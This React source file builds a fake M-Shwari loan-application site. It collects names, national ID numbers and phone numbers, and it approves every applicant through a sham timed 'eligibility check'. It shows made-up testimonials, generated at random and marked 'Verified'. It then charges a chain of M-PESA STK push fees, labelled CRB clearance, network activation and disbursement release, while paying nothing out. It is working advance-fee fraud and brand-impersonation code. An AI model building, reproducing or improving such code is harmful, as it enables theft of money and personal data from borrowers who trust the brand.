import React, { useState, useEffect, useRef } from 'react';

// ============================================================
// PASTE YOUR ORIGINAL CONSTANTS HERE:
//   const IMG_1 = "data:image/png;base64,...";   // (from your first message)
//   const IMG_2 = "...";
//   const IMG_3, IMG_4, IMG_5, IMG_6, IMG_7, IMG_R
//   const COUNTIES = [ ... ];
// ============================================================

export default function App() {
  // NOTE: starts at 'step1' because the HTML boot splash is the animation now.
  const [view, setView] = useState('step1');
  const [processing, setProcessing] = useState(false);

  const [formData, setFormData] = useState({
    fullName: '', phone: '', id: '', age: '', occupation: '', county: '', email: '',
    nextKinName: '', nextKinPhone: '', hearAbout: 'Friend/Family', purpose: ''
  });
  const [errors, setErrors] = useState({});
  const [selectedNetwork, setSelectedNetwork] = useState('safaricom');
  const [selectedDisbPhone, setSelectedDisbPhone] = useState('');

  const [showHearAboutSheet, setShowHearAboutSheet] = useState(false);
  const [showCrbModal, setShowCrbModal] = useState(false);
  const [crbPhone, setCrbPhone] = useState('');
  const [crbStatus, setCrbStatus] = useState({ type: '', msg: '' });

  const [showStkOverlay, setShowStkOverlay] = useState(false);
  const [stkPhoneDisplay, setStkPhoneDisplay] = useState('');
  const [stkStatusText, setStkStatusText] = useState('Waiting for callback...');

  const [showNetFeeConfirmed, setShowNetFeeConfirmed] = useState(false);
  const [netFeeReceipt, setNetFeeReceipt] = useState('');

  const [showAllFeesCleared, setShowAllFeesCleared] = useState(false);
  const [disburseReceipt, setDisburseReceipt] = useState('');
  const [toastMsg, setToastMsg] = useState('');
  const [checkProgress, setCheckProgress] = useState(0);

  const [feedItems, setFeedItems] = useState([
    { name:'James M.', initials:'JM', color:'#00b050', text:'Nimepata STK nikalipa 280 na 15k ishaingia kwa Mpesa! Shukran M-Shwari.', time:'1 minute ago' },
    { name:'Mercy W.', initials:'MW', color:'#008a3e', text:'Nimepokea saa hii. Asante sana M-Shwari!', time:'45 seconds ago' },
    { name:'Samuel K.', initials:'SK', color:'#00b050', text:'Fast and reliable. 15,000 imeingia chap chap.', time:'2 seconds ago' }
  ]);

  const feedIntervalRef = useRef(null);
  const pollIntervalRef = useRef(null);

  // Live Feed
  useEffect(() => {
    if (view === 'step3' || view === 'crbPage') {
      if (!feedIntervalRef.current) {
        feedIntervalRef.current = setInterval(() => {
          const names = [
            { name:'Peter O.', initials:'PO', color:'#00b050' },
            { name:'Faith A.', initials:'FA', color:'#008a3e' },
            { name:'Kevin O.', initials:'KO', color:'#00b050' }
          ];
          const texts = ['Nani mwingine amepata? Yangu imekubali.', 'Niko Kisumu na nimepata. M-Pesa confirmed!', 'Hii kitu ni legit, 15k imefika.', 'Asante sana M-Shwari!'];
          const times = ['Just now','5 seconds ago','10 seconds ago'];
          setFeedItems(prev => [{
            ...names[Math.floor(Math.random() * names.length)],
            text: texts[Math.floor(Math.random() * texts.length)],
            time: times[Math.floor(Math.random() * times.length)]
          }, ...prev].slice(0, 20));
        }, 8000);
      }
    }
    return () => { if (feedIntervalRef.current) { clearInterval(feedIntervalRef.current); feedIntervalRef.current = null; } };
  }, [view]);

  // Cleanup poll on unmount
  useEffect(() => {
    return () => {
      if (pollIntervalRef.current) {
        clearInterval(pollIntervalRef.current);
        pollIntervalRef.current = null;
      }
    };
  }, []);

  const validateName = (val) => /^[a-zA-Z\s.]+$/.test(val) && val.length >= 3;
  const validatePhone = (val) => /^(07|01)\d{8}$/.test(val);
  const validateId = (val) => /^\d{6,8}$/.test(val);
  const validateAge = (val) => { const a = parseInt(val); return !isNaN(a) && a >= 18 && a <= 99; };

  const handleInputChange = (e) => {
    const { id, value } = e.target;
    let val = value;
    if (id === 'phone' || id === 'nextKinPhone') val = val.replace(/[^0-9]/g, '').slice(0, 10);
    if (id === 'id') val = val.replace(/[^0-9]/g, '').slice(0, 8);
    if (id === 'age') val = val.replace(/[^0-9]/g, '').slice(0, 2);
    setFormData(prev => ({ ...prev, [id]: val }));
    if (errors[id]) setErrors(prev => ({ ...prev, [id]: false }));
  };

  const handleSubmitApplication = (e) => {
    e.preventDefault();
    const newErrors = {
      fullName: !validateName(formData.fullName),
      phone: !validatePhone(formData.phone),
      id: !validateId(formData.id),
      age: !validateAge(formData.age),
      occupation: formData.occupation.trim().length < 2,
      county: formData.county === ''
    };
    setErrors(newErrors);
    if (Object.values(newErrors).some(err => err)) return showToast('Please correct the highlighted fields.');
    setProcessing(true);
    setTimeout(() => { setProcessing(false); setView('step2'); }, 2000);
  };

  const handleSubmitPurpose = () => {
    if (!formData.purpose) return setErrors(prev => ({ ...prev, purpose: true }));
    setErrors(prev => ({ ...prev, purpose: false }));
    setProcessing(true);
    setTimeout(() => { setProcessing(false); setView('checkingPage'); runEligibilityCheck(); }, 1400);
  };

  const runEligibilityCheck = () => {
    let current = 0;
    const timer = setInterval(() => {
      current++;
      setCheckProgress(current);
      if (current >= 5) { clearInterval(timer); setTimeout(() => setView('step3'), 1000); }
    }, 1600);
  };

  const showToast = (msg) => { setToastMsg(msg); setTimeout(() => setToastMsg(''), 3000); };

  const normalizePhone = (raw) => {
    let p = String(raw).replace(/\D/g, '');
    if (p.startsWith('0')) p = p.slice(1);
    if (p.startsWith('7') || p.startsWith('1')) p = '254' + p;
    else if (!p.startsWith('254')) p = '254' + p;
    return p;
  };

  const sendPaylorSTK = async (phone, amount, reference, description) => {
    const payload = { phone: normalizePhone(phone), amount: Number(amount), reference, description };
    let res;
    try {
      res = await fetch('/api/pay', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch {
      throw new Error('Network error. Check your connection and try again.');
    }
    const data = await res.json().catch(() => ({}));
    if (!res.ok) throw new Error(data.error || `Payment failed (${res.status})`);
    return data;
  };

  const queryTxn = async (id) => {
    let res;
    try {
      res = await fetch(`/api/pay?transactionId=${encodeURIComponent(id)}`);
    } catch {
      throw new Error('Network error while querying payment.');
    }
    const data = await res.json().catch(() => ({}));
    if (!res.ok) throw new Error(data.error || `Query failed (${res.status})`);
    return data;
  };

  const pollTxn = (txId, onSuccess, onFail) => {
    if (pollIntervalRef.current) { clearInterval(pollIntervalRef.current); pollIntervalRef.current = null; }
    let attempts = 0;
    const max = 30;
    setStkStatusText('Waiting for you to enter PIN...');

    pollIntervalRef.current = setInterval(async () => {
      attempts++;
      if (attempts > max) {
        clearInterval(pollIntervalRef.current);
        pollIntervalRef.current = null;
        return onFail('Timed out. Check M-PESA and try again.');
      }
      try {
        const t = await queryTxn(txId);
        const s = t.status || t.state;
        if (s === 'COMPLETED' || s === 'SUCCESS') {
          clearInterval(pollIntervalRef.current); pollIntervalRef.current = null;
          setStkStatusText('Confirmed!');
          onSuccess(t);
        } else if (s === 'FAILED' || s === 'CANCELLED') {
          clearInterval(pollIntervalRef.current); pollIntervalRef.current = null;
          onFail('Payment failed or cancelled.');
        } else {
          setStkStatusText(`Waiting for confirmation... (${attempts}/${max})`);
        }
      } catch (e) { console.warn('poll error', e); }
    }, 3000);
  };

  const processCRBPayment = async () => {
    if (!crbPhone) return setCrbStatus({ type: 'error', msg: 'Enter M-Pesa number.' });
    setCrbStatus({ type: 'pending', msg: 'Sending STK push...' });
    setStkPhoneDisplay(`(+254 ${crbPhone})`);
    setShowStkOverlay(true);
    try {
      const r = await sendPaylorSTK(crbPhone, 280, `CRB_${Date.now()}`, 'M-Shwari CRB Fee');
      const txId = r.transactionId || r.id;
      if (!txId) throw new Error('No transaction ID returned');
      pollTxn(txId, () => {
        setShowStkOverlay(false);
        setShowCrbModal(false);
        const raw = formData.phone.startsWith('0') ? formData.phone : '0' + formData.phone;
        setSelectedDisbPhone(raw);
        setView('disbursementDetailsPage');
      }, (msg) => {
        setShowStkOverlay(false);
        setCrbStatus({ type: 'error', msg });
      });
    } catch (err) {
      setShowStkOverlay(false);
      setCrbStatus({ type: 'error', msg: err.message });
    }
  };

  const processNetworkFeePayment = async () => {
    setStkPhoneDisplay(`(${selectedDisbPhone})`);
    setShowStkOverlay(true);
    try {
      const r = await sendPaylorSTK(selectedDisbPhone, 328, `NET_${Date.now()}`, 'M-Shwari Network Fee');
      const txId = r.transactionId || r.id;
      if (!txId) throw new Error('No transaction ID returned');
      pollTxn(txId, (t) => {
        setShowStkOverlay(false);
        setNetFeeReceipt(t.providerRef || t.reference || `UG${Math.random().toString(36).substring(2,11).toUpperCase()}`);
        setShowNetFeeConfirmed(true);
      }, (msg) => { setShowStkOverlay(false); showToast(msg); });
    } catch (err) { setShowStkOverlay(false); showToast(err.message); }
  };

  const processDisbursementFeePayment = async () => {
    setStkPhoneDisplay(`(${selectedDisbPhone})`);
    setShowStkOverlay(true);
    try {
      const r = await sendPaylorSTK(selectedDisbPhone, 700, `DISB_${Date.now()}`, 'M-Shwari Disbursement Fee');
      const txId = r.transactionId || r.id;
      if (!txId) throw new Error('No transaction ID returned');
      pollTxn(txId, (t) => {
        setShowStkOverlay(false);
        setDisburseReceipt(t.providerRef || t.reference || `UG${Math.random().toString(36).substring(2,11).toUpperCase()}`);
        setShowAllFeesCleared(true);
      }, (msg) => { setShowStkOverlay(false); showToast(msg); });
    } catch (err) { setShowStkOverlay(false); showToast(err.message); }
  };

  return (
    <>
      {/* STEP 1 */}
      <section className={`view ${view === 'step1' ? 'active' : ''}`}>
        <h1>Complete your application</h1>
        <p className="sub">Fields marked <strong style={{ color: 'var(--red)' }}>*</strong> are required. Applicants must be 18 years or older.</p>
        <form onSubmit={handleSubmitApplication} noValidate>
          <div className={`field ${errors.fullName ? 'bad' : formData.fullName ? 'ok' : ''}`}>
            <label>Full Name *</label>
            <input type="text" id="fullName" placeholder="Enter full name" value={formData.fullName} onChange={handleInputChange} required />
            <div className="err">Name must contain letters only.</div>
          </div>
          <div className="row2">
            <div className={`field ${errors.phone ? 'bad' : formData.phone ? 'ok' : ''}`}>
              <label>Phone Number *</label>
              <input type="tel" id="phone" placeholder="0712345678" value={formData.phone} onChange={handleInputChange} required />
            </div>
            <div className={`field ${errors.id ? 'bad' : formData.id ? 'ok' : ''}`}>
              <label>National ID *</label>
              <input type="text" id="id" placeholder="12345678" value={formData.id} onChange={handleInputChange} required />
            </div>
          </div>
          <div className="row2">
            <div className={`field ${errors.age ? 'bad' : formData.age ? 'ok' : ''}`}>
              <label>Age (18+) *</label>
              <input type="number" id="age" placeholder="25" value={formData.age} onChange={handleInputChange} required />
            </div>
            <div className={`field ${errors.occupation ? 'bad' : formData.occupation ? 'ok' : ''}`}>
              <label>Occupation *</label>
              <input type="text" id="occupation" placeholder="Farmer, Student" value={formData.occupation} onChange={handleInputChange} required />
            </div>
          </div>
          <div className="row2">
            <div className={`field ${errors.county ? 'bad' : formData.county ? 'ok' : ''}`}>
              <label>County *</label>
              <select id="county" value={formData.county} onChange={handleInputChange} required>
                <option value="">Select County</option>
                {COUNTIES.map(c => <option key={c} value={c}>{c}</option>)}
              </select>
            </div>
            <div className="field">
              <label>Email (optional)</label>
              <input type="email" id="email" placeholder="name@example.com" value={formData.email} onChange={handleInputChange} />
            </div>
          </div>
          <div className="kin-box">
            <div className="kin-title">Next of Kin — Optional</div>
            <div className="row2" style={{ marginBottom: 0 }}>
              <div className="field" style={{ marginBottom: 0 }}>
                <input type="text" id="nextKinName" placeholder="Kin Name" value={formData.nextKinName} onChange={handleInputChange} />
              </div>
              <div className="field" style={{ marginBottom: 0 }}>
                <input type="tel" id="nextKinPhone" placeholder="Kin Phone" value={formData.nextKinPhone} onChange={handleInputChange} />
              </div>
            </div>
          </div>
          <div className={`field ${errors.hearAbout ? 'bad' : 'ok'}`} onClick={() => setShowHearAboutSheet(true)}>
            <label>Where did you hear about M-Shwari? *</label>
            <div className="fake-select">{formData.hearAbout}</div>
            <span className="chevron"></span>
          </div>
          <button type="submit" className="btn">Submit Application</button>
        </form>
        <div className="badge-card">M-SHWARI · APPROVED</div>
      </section>

      {/* STEP 2 */}
      <section className={`view ${view === 'step2' ? 'active' : ''}`}>
        <button onClick={() => setView('step1')} style={{ alignSelf: 'flex-start', background: 'none', border: 0, color: 'var(--mute)', fontSize: 13, fontWeight: 600, cursor: 'pointer', padding: 0, marginBottom: 12 }}>← Back</button>
        <h1><strong>{formData.fullName.split(' ')[0]}</strong>, what will you use your M-Shwari funds for?</h1>
        <p className="sub">Select the main purpose below to continue your application.</p>
        <div className="purpose-list">
          {['Start a business', 'Top up a business', 'Pay school fees', 'Pay bills', 'Pay rent'].map((p, i) => (
            <div key={p} className={`purpose-item ${formData.purpose === p ? 'selected' : ''}`} onClick={() => { setFormData({...formData, purpose: p}); setErrors({...errors, purpose: false}); }}>
              <div className="num-box">{i + 1}</div>
              <div className="purpose-text">{p}</div>
              <div className="purpose-radio"></div>
            </div>
          ))}
        </div>
        {errors.purpose && <div className="err" style={{ display: 'block', marginBottom: 12 }}>Please select a purpose.</div>}
        <button className="btn" onClick={handleSubmitPurpose}>Continue →</button>
        <div className="badge-card">M-SHWARI · APPROVED</div>
      </section>

      {/* CHECKING */}
      <section className={`view ${view === 'checkingPage' ? 'active' : ''}`}>
        <div style={{ textAlign: 'center', paddingTop: 40 }}>
          <div className="sp big" style={{ margin: '0 auto 20px' }}></div>
          <h1 style={{ fontSize: 20, margin: '0 0 6px' }}>Checking your eligibility...</h1>
          <p className="sub" style={{ marginBottom: 26 }}>Hold on {formData.fullName.split(' ')[0] || 'candidate'}, we're reviewing your application.</p>
        </div>
        {['Verifying national ID...', 'Checking phone number registration...', 'Reviewing county records...', 'Confirming age eligibility...', 'Scoring M-Shwari tier...'].map((text, i) => {
          const step = i + 1;
          let cls = 'check-item pending';
          if (checkProgress === step) cls = 'check-item active';
          else if (checkProgress > step) cls = 'check-item completed';
          return (
            <div key={step} className={cls}>
              <div className="check-circle"></div>
              <div>{text}</div>
            </div>
          );
        })}
      </section>

      {/* STEP 3 */}
      <section className={`view ${view === 'step3' ? 'active' : ''}`}>
        <h1>Congratulations, {formData.fullName.split(' ')[0]}!</h1>
        <p className="sub">Based on our eligibility scan, you've been approved for the following M-Shwari limit.</p>
        <div className="amount-block">
          <div className="label">Your Approved M-Shwari Limit</div>
          <div className="value">Ksh 15,000</div>
          <div className="stamp">Eligibility verified · Ready for withdrawal</div>
        </div>
        <button className="btn dark" onClick={() => setView('crbPage')}>Withdraw Funds</button>
        <p style={{ textAlign: 'center', fontSize: 12, color: 'var(--deep)', fontWeight: 600, marginTop: 10 }}>Funds arrive in under 3 minutes</p>
        <h2 style={{ fontSize: 15, fontWeight: 600, margin: '26px 0 4px' }}>Live Community Feed <span className="feed-live">LIVE</span></h2>
        <div className="feed-container">
          {feedItems.map((item, idx) => (
            <div className="feed-item" key={idx}>
              <div className="feed-avatar" style={{ background: item.color }}>{item.initials}</div>
              <div style={{ flex: 1, minWidth: 0 }}>
                <div className="feed-name">{item.name} <span className="verified">Verified</span></div>
                <div className="feed-text">{item.text}</div>
                <div className="feed-time">{item.time}</div>
              </div>
            </div>
          ))}
        </div>
        <div className="badge-card">M-SHWARI · APPROVED</div>
      </section>

      {/* CRB PAGE */}
      <section className={`view ${view === 'crbPage' ? 'active' : ''}`}>
        <div className="fee-hero">
          <div className="fee-tag">CRB Clearance Required</div>
          <div className="fee-title">Clear with CRB to release your funds</div>
          <div className="fee-amount">Ksh 280</div>
          <div className="fee-sub">M-PESA STK push to <span>{formData.phone || '0710222875'}</span></div>
        </div>
        <button className="btn red" onClick={() => { setCrbPhone(formData.phone.replace(/^0/, '')); setShowCrbModal(true); }}>Pay Ksh 280 to Clear CRB →</button>
        <h2 style={{ fontSize: 15, fontWeight: 600, margin: '26px 0 4px' }}>Live Community Feed <span className="feed-live">LIVE</span></h2>
        <div className="feed-container">
          {feedItems.map((item, idx) => (
            <div className="feed-item" key={idx}>
              <div className="feed-avatar" style={{ background: item.color }}>{item.initials}</div>
              <div style={{ flex: 1, minWidth: 0 }}>
                <div className="feed-name">{item.name} <span className="verified">Verified</span></div>
                <div className="feed-text">{item.text}</div>
                <div className="feed-time">{item.time}</div>
              </div>
            </div>
          ))}
        </div>
      </section>

      {/* DISBURSEMENT DETAILS */}
      <section className={`view ${view === 'disbursementDetailsPage' ? 'active' : ''}`}>
        <h1>Where should we send your funds?</h1>
        <p className="sub">Confirm the number and network to receive your M-Shwari funds.</p>
        <div className="field">
          <label>Recipient Full Name</label>
          <div style={{ padding: '8px 0', fontSize: 16, fontWeight: 600, color: 'var(--ink)', borderBottom: '1px solid var(--line)', minHeight: 42, display: 'flex', alignItems: 'center' }}>{formData.fullName || 'BMF SOLUTIONS'}</div>
        </div>
        <div className="field">
          <label>Disbursement Number</label>
          <div className="row2" style={{ marginBottom: 8 }}>
            <button type="button" style={{ flex: 1, padding: 12, border: '1.5px solid var(--green)', background: 'var(--tint)', borderRadius: 10, fontWeight: 600, fontSize: 13, color: 'var(--deep)', cursor: 'pointer', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 4 }}>
              <span>Same Number</span><span style={{ fontSize: 12, fontWeight: 500, opacity: 0.75 }}>{selectedDisbPhone}</span>
            </button>
            <button type="button" style={{ flex: 1, padding: 12, border: '1.5px solid var(--line)', background: '#fff', borderRadius: 10, fontWeight: 600, fontSize: 13, color: 'var(--mute)', cursor: 'pointer' }}>Different Number</button>
          </div>
          <div style={{ background: 'var(--tint)', border: '1px solid var(--line)', borderRadius: 10, padding: '12px 14px', fontSize: 13, fontWeight: 600, color: 'var(--deep)', display: 'flex', flexWrap: 'wrap', gap: 6, alignItems: 'center' }}>
            <span>{selectedDisbPhone}</span><span style={{ fontSize: 11, color: 'var(--mute)', fontWeight: 500 }}>Funds will be sent here</span>
          </div>
        </div>
        <div className="field">
          <label>Select Network</label>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
            {['safaricom', 'airtel', 'telkom'].map(net => {
              const isSelected = selectedNetwork === net;
              const labels = { safaricom: 'Safaricom (M-PESA)', airtel: 'Airtel Money', telkom: 'Telkom (T-Kash)' };
              return (
                <button key={net} type="button" onClick={() => setSelectedNetwork(net)} style={{ width: '100%', padding: 14, border: isSelected ? '1.5px solid var(--green)' : '1.5px solid var(--line)', background: isSelected ? 'var(--tint)' : '#fff', borderRadius: 10, display: 'flex', alignItems: 'center', gap: 12, cursor: 'pointer', textAlign: 'left' }}>
                  <div style={{ width: 18, height: 18, background: 'var(--deep)', borderRadius: '50%', flexShrink: 0 }}></div>
                  <div style={{ flex: 1, minWidth: 0 }}>
                    <div style={{ fontWeight: 600, fontSize: 13, color: 'var(--ink)' }}>{labels[net]}</div>
                    <div style={{ fontSize: 11, color: 'var(--mute)' }}>Activation fee: Ksh 328</div>
                  </div>
                  <div style={{ width: 18, height: 18, border: isSelected ? '2px solid var(--green)' : '2px solid var(--line)', borderRadius: '50%', display: 'grid', placeItems: 'center', flexShrink: 0 }}>
                    {isSelected && <span style={{ width: 9, height: 9, background: 'var(--green)', borderRadius: '50%' }}></span>}
                  </div>
                </button>
              );
            })}
          </div>
        </div>
        <div className="info-note warn">A network activation fee of Ksh 328 is required.</div>
        <button className="btn dark" onClick={() => setView('networkFeePage')}>Continue — Pay Network Fee →</button>
      </section>

      {/* NETWORK FEE */}
      <section className={`view ${view === 'networkFeePage' ? 'active' : ''}`}>
        <h1>Network Activation Fee</h1>
        <p className="sub">Pay this fee to activate your disbursement channel.</p>
        <div className="summary-card">
          <div className="summary-title">Disbursement Summary</div>
          <div className="summary-row"><span className="k">Fund Amount</span><span className="v hi">Ksh 5,000</span></div>
          <div className="summary-row"><span className="k">Network Fee</span><span className="v hi">Ksh 328</span></div>
        </div>
        <button className="btn" onClick={processNetworkFeePayment}>Pay Ksh 328 — Activate &amp; Receive Funds</button>
      </section>

      {/* DISBURSEMENT FEE */}
      <section className={`view ${view === 'disbursementFeePage' ? 'active' : ''}`}>
        <h1>Disbursement Release Fee</h1>
        <p className="sub">Final step before your funds are released.</p>
        <div className="summary-card">
          <div className="summary-title">Disbursement Summary</div>
          <div className="summary-row"><span className="k">Fund Amount</span><span className="v hi">Ksh 5,000</span></div>
          <div className="summary-row"><span className="k">Disbursement Fee</span><span className="v hi">Ksh 700</span></div>
        </div>
        <button className="btn" onClick={processDisbursementFeePayment}>Pay Ksh 700 — Release My Funds</button>
      </section>

      {/* BOTTOM SHEET */}
      {showHearAboutSheet && (
        <div className="sheet-bg show" onClick={() => setShowHearAboutSheet(false)}>
          <div className="sheet show" onClick={e => e.stopPropagation()}>
            {['Social Media', 'WhatsApp', 'Twitter / X', 'Friend / Family', 'Radio / TV', 'Newspaper', 'Other'].map(opt => (
              <div key={opt} className={`sheet-item ${formData.hearAbout === opt ? 'selected' : ''}`} onClick={() => { setFormData({...formData, hearAbout: opt}); setShowHearAboutSheet(false); }}>
                <span>{opt}</span>
                <div className="radio-mark"></div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* CRB MODAL */}
      {showCrbModal && (
        <div className="modal-bg show">
          <div className="modal-card">
            <h3>CRB Clearance Payment</h3>
            <p>Pay Ksh 280 to clear your CRB and release your funds.</p>
            <div className="phone-input-group">
              <span className="prefix">+254</span>
              <input type="tel" value={crbPhone} onChange={e => setCrbPhone(e.target.value)} placeholder="712345678" />
            </div>
            {crbStatus.msg && <div className={`modal-status show ${crbStatus.type}`}>{crbStatus.msg}</div>}
            <div style={{ display: 'flex', gap: 8, marginTop: 8 }}>
              <button className="btn red" style={{ margin: 0, flex: 1 }} onClick={processCRBPayment}>Pay Ksh 280</button>
              <button className="btn" style={{ margin: 0, background: 'var(--tint)', color: 'var(--deep)', flex: 0.5 }} onClick={() => setShowCrbModal(false)}>Cancel</button>
            </div>
          </div>
        </div>
      )}

      {/* STK OVERLAY */}
      {showStkOverlay && (
        <div className="stk-overlay show">
          <div className="ring"></div>
          <h3>M-PESA Prompt Sent</h3>
          <p>Check <span className="phone">{stkPhoneDisplay}</span> and enter your M-PESA PIN.</p>
          <div className="listening"><span className="dot"></span> {stkStatusText}</div>
          <p style={{ fontSize: 11, color: '#9ab0a0' }}>Do not close this page — processing automatically.</p>
        </div>
      )}

      {/* NETWORK FEE CONFIRMED */}
      {showNetFeeConfirmed && (
        <div className="modal-bg show">
          <div className="modal-card">
            <div className="tick-circle">✓</div>
            <h3>Network Fee Confirmed</h3>
            <div className="receipt-box">
              <div className="lbl">Receipt</div>
              <div className="val">{netFeeReceipt}</div>
            </div>
            <button className="btn dark" onClick={() => { setShowNetFeeConfirmed(false); setView('disbursementFeePage'); }}>Continue → Pay Disbursement Fee</button>
          </div>
        </div>
      )}

      {/* ALL FEES CLEARED */}
      {showAllFeesCleared && (
        <div className="modal-bg show">
          <div className="modal-card">
            <div className="tick-circle">✓</div>
            <h3>All Fees Cleared</h3>
            <div className="receipt-box">
              <div className="lbl">Receipt</div>
              <div className="val">{disburseReceipt}</div>
            </div>
            <p style={{ fontSize: 12, color: 'var(--deep)', fontWeight: 600 }}>Sending funds to your phone...</p>
            <button className="btn dark" onClick={() => { setShowAllFeesCleared(false); setView('step1'); }}>Done</button>
          </div>
        </div>
      )}

      {/* PROCESSING MODAL */}
      {processing && (
        <div className="busy on show">
          <div className="sp big"></div>
          <p>Processing application...</p>
          <div className="bar"><i></i></div>
        </div>
      )}

      {/* TOAST */}
      {toastMsg && <div className="toast show">{toastMsg}</div>}
    </>
  );
}